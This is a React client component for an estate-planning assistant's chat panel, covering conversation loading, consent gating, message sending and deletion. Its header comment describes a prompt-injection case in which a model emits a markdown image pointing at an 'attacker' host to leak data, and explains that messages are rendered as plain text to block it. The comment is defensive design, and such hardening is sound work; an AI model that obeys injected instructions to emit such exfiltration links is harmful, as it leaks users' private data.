'use client';

import Link from 'next/link';
import { useCallback, useEffect, useRef, useState, type FormEvent, type ReactElement } from 'react';
import { gqlRequest, type ConversationInfo, type TranscriptMessageInfo } from '../graphql/client';
import { messageFor } from '../lib/copy';
import { MessageText } from './MessageText';

/**
 * The conversation surface (M11) — the first place model-authored text reaches
 * a person in this product.
 *
 * EVERY MESSAGE RENDERS THROUGH `MessageText`, both roles. That component
 * builds text nodes and nothing else, so a model persuaded by an injected
 * instruction to emit `![](https://attacker/?d=…)` produces those characters on
 * screen rather than a request from the victim's browser (docs/03 §6d). The
 * user's own text goes through the same component: it carries no new risk, but
 * one renderer for both roles is what stops a later edit giving the assistant's
 * half a richer path.
 *
 * CONSENT IS PART OF THE UI, NOT AN ERROR PATH. The turn route refuses outright
 * when `assistant.enabled` is off (M10 security review), so the composer is
 * disabled with an explanation and a link rather than accepting text that is
 * going to be rejected. A box that takes what you type and throws it away is a
 * worse answer than a box that says why it is closed.
 */

type LoadState =
  | { kind: 'loading' }
  | { kind: 'signedOut' }
  | { kind: 'error' }
  | { kind: 'ready'; conversations: ConversationInfo[]; enabled: boolean };

/** Local echo of the user's message while the turn is in flight. */
interface PendingMessage {
  readonly text: string;
}

function formatWhen(iso: string): string {
  const parsed = new Date(iso);
  return Number.isNaN(parsed.getTime())
    ? ''
    : parsed.toLocaleString(undefined, { dateStyle: 'medium', timeStyle: 'short' });
}

export function ChatPanel(): ReactElement {
  const [state, setState] = useState<LoadState>({ kind: 'loading' });
  const [activeId, setActiveId] = useState<string | null>(null);
  const [messages, setMessages] = useState<TranscriptMessageInfo[]>([]);
  const [pending, setPending] = useState<PendingMessage | null>(null);
  const [draft, setDraft] = useState('');
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const endRef = useRef<HTMLDivElement | null>(null);

  const load = useCallback(async (): Promise<void> => {
    const [conversations, consents] = await Promise.all([
      gqlRequest('Conversations', {}),
      gqlRequest('Consents', {}),
    ]);
    if (conversations.ok && consents.ok) {
      /*
       * A WELL-FORMED RESPONSE MISSING ITS FIELD IS NOT DATA (found by running
       * the real app: a payload of `{"data":{}}` — an ordinary version skew
       * between this client and the BFF — made `conversations.length` throw and
       * white-screened the page). `gqlRequest` answers `ok` for any `data`
       * object, so shape is this component's job, and the repo's own rule
       * applies: a partially-understood response must read as NO DATA rather
       * than as data. An honest "we couldn't load this" beats a blank screen,
       * and beats an empty list that reads as "you have no conversations".
       */
      if (
        Array.isArray(conversations.data.conversations) &&
        Array.isArray(consents.data.consents)
      ) {
        setState({
          kind: 'ready',
          conversations: conversations.data.conversations,
          enabled: consents.data.consents.includes('assistant.enabled'),
        });
        return;
      }
      setState({ kind: 'error' });
      return;
    }
    const code = !conversations.ok ? conversations.code : !consents.ok ? consents.code : 'UNKNOWN';
    setState(code === 'UNAUTHENTICATED' ? { kind: 'signedOut' } : { kind: 'error' });
  }, []);

  useEffect(() => {
    void load();
  }, [load]);

  useEffect(() => {
    // Guarded rather than called bare: `scrollIntoView` is absent in jsdom and
    // in older embedded webviews, and a convenience that throws inside an
    // effect takes the whole panel down with it.
    const end = endRef.current;
    if (typeof end?.scrollIntoView === 'function') {
      end.scrollIntoView({ block: 'end' });
    }
  }, [messages, pending]);

  async function openConversation(conversationId: string): Promise<void> {
    setError(null);
    setActiveId(conversationId);
    setMessages([]);
    const result = await gqlRequest('Conversation', { conversationId });
    if (!result.ok) {
      setError(messageFor(result.code));
      return;
    }
    // Same rule as `load`: a transcript that is not a list of messages is a
    // response we do not understand, not an empty conversation.
    const transcript = result.data.conversation;
    if (!Array.isArray(transcript?.messages)) {
      setError(messageFor('UNKNOWN'));
      return;
    }
    setMessages(transcript.messages);
  }

  async function startConversation(): Promise<void> {
    setError(null);
    setBusy(true);
    const result = await gqlRequest('StartConversation', {});
    setBusy(false);
    if (!result.ok) {
      setError(messageFor(result.code));
      return;
    }
    setActiveId(result.data.startConversation.conversationId);
    setMessages([]);
    await load();
  }

  async function send(event: FormEvent): Promise<void> {
    event.preventDefault();
    const text = draft.trim();
    if (text.length === 0 || activeId === null) {
      return;
    }
    setError(null);
    setDraft('');
    // Echo the question immediately: a turn waits on a real provider round
    // trip, and a composer that silently swallows the text for ten seconds
    // reads as broken.
    setPending({ text });
    setBusy(true);
    const result = await gqlRequest('SendMessage', { conversationId: activeId, text });
    setBusy(false);
    setPending(null);
    if (!result.ok) {
      // The question goes back in the box rather than being lost — the turn did
      // not happen, so the user should be able to retry without retyping.
      setDraft(text);
      setError(messageFor(result.code));
      return;
    }
    // Re-read rather than appending locally: the transcript is the record, and
    // the server's copy is the one that survived the transaction.
    await openConversation(activeId);
  }

  async function remove(conversationId: string): Promise<void> {
    setError(null);
    setBusy(true);
    const result = await gqlRequest('DeleteConversation', { conversationId });
    setBusy(false);
    if (!result.ok) {
      setError(messageFor(result.code));
      return;
    }
    if (activeId === conversationId) {
      setActiveId(null);
      setMessages([]);
    }
    await load();
  }

  if (state.kind === 'loading') {
    return (
      <div className="card p-6" role="status">
        <p className="text-sm text-ink-muted">Loading your conversations…</p>
      </div>
    );
  }

  if (state.kind === 'error') {
    return (
      <div className="card p-6" role="status">
        <p className="text-sm text-ink-muted">
          We couldn’t load your conversations. Please try again in a moment.
        </p>
      </div>
    );
  }

  if (state.kind === 'signedOut') {
    return (
      <div className="card p-6">
        <h2 className="text-lg font-semibold">Sign in required</h2>
        <p className="mt-2 text-sm text-ink-muted">
          Conversations belong to your account. Sign in to see them.
        </p>
        <div className="mt-4 flex flex-wrap gap-3">
          <Link className="btn btn-primary" href="/login">
            Sign in
          </Link>
        </div>
      </div>
    );
  }

  const { conversations, enabled } = state;

  return (
    <div className="grid gap-4 lg:grid-cols-[16rem_minmax(0,1fr)]">
      <section aria-labelledby="conversations-heading" className="card p-4">
        <div className="flex items-center justify-between gap-2">
          <h2 id="conversations-heading" className="text-sm font-semibold">
            Conversations
          </h2>
          <button
            type="button"
            className="btn btn-secondary"
            disabled={busy || !enabled}
            onClick={() => {
              void startConversation();
            }}
          >
            New
          </button>
        </div>
        {conversations.length === 0 ? (
          <p className="mt-3 text-[0.8125rem] text-ink-muted">Nothing yet.</p>
        ) : (
          <ul className="mt-3">
            {conversations.map((conversation) => (
              <li
                key={conversation.conversationId}
                className="flex items-center justify-between gap-2 border-b border-line py-2 last:border-b-0"
              >
                <button
                  type="button"
                  className={`min-w-0 flex-1 text-left text-[0.8125rem] ${
                    conversation.conversationId === activeId ? 'font-semibold' : 'text-ink-muted'
                  }`}
                  onClick={() => {
                    void openConversation(conversation.conversationId);
                  }}
                >
                  {formatWhen(conversation.updatedAt)}
                </button>
                <button
                  type="button"
                  className="text-xs text-ink-muted underline"
                  disabled={busy}
                  onClick={() => {
                    void remove(conversation.conversationId);
                  }}
                >
                  Delete
                </button>
              </li>
            ))}
          </ul>
        )}
      </section>

      <section aria-labelledby="transcript-heading" className="card flex flex-col p-5">
        <h2 id="transcript-heading" className="sr-only">
          Transcript
        </h2>

        <div className="min-h-[18rem] flex-1 space-y-4">
          {activeId === null ? (
            <p className="text-sm text-ink-muted">
              Pick a conversation, or start a new one. The assistant reads only what you have
              allowed it to, and every answer is education rather than legal advice.
            </p>
          ) : (
            <>
              {messages.map((message) => (
                <div
                  key={message.messageId}
                  className={message.role === 'user' ? 'text-right' : ''}
                >
                  <p className="text-[0.6875rem] font-semibold uppercase tracking-[0.08em] text-ink-muted">
                    {message.role === 'user' ? 'You' : 'Assistant'}
                  </p>
                  {/* Text nodes only — see MessageText and docs/03 §6d. */}
                  <MessageText className="mt-1 text-sm" text={message.text} />
                </div>
              ))}
              {pending !== null ? (
                <div className="text-right opacity-70">
                  <p className="text-[0.6875rem] font-semibold uppercase tracking-[0.08em] text-ink-muted">
                    You
                  </p>
                  <MessageText className="mt-1 text-sm" text={pending.text} />
                  <p className="mt-1 text-xs text-ink-muted">Thinking…</p>
                </div>
              ) : null}
            </>
          )}
          <div ref={endRef} />
        </div>

        {enabled ? (
          <form
            className="mt-4 flex gap-2"
            noValidate
            onSubmit={(event) => {
              void send(event);
            }}
          >
            <label className="sr-only" htmlFor="chat-input">
              Message
            </label>
            <input
              id="chat-input"
              className="field-input flex-1"
              placeholder={
                activeId === null ? 'Start a conversation first' : 'Ask about your estate'
              }
              value={draft}
              disabled={busy || activeId === null}
              onChange={(event) => {
                setDraft(event.target.value);
              }}
            />
            <button
              type="submit"
              className="btn btn-primary"
              disabled={busy || activeId === null || draft.trim().length === 0}
            >
              {busy ? 'Sending…' : 'Send'}
            </button>
          </form>
        ) : (
          // Consent as UI, not as an error: the turn route refuses outright with
          // the master switch off, so an enabled-looking composer would take
          // what the user typed and throw it away.
          <div className="mt-4 rounded-[var(--radius-card)] border border-line p-4">
            <p className="text-sm font-medium">The assistant is switched off</p>
            <p className="mt-1 text-[0.8125rem] text-ink-muted">
              Nothing is analysed and no conversation can run while it is off.
            </p>
            <Link className="btn btn-primary mt-3" href="/assistant">
              Review what it may read
            </Link>
          </div>
        )}

        <div role="status" aria-live="polite">
          {error !== null ? <p className="mt-3 text-sm text-danger">{error}</p> : null}
        </div>
      </section>
    </div>
  );
}
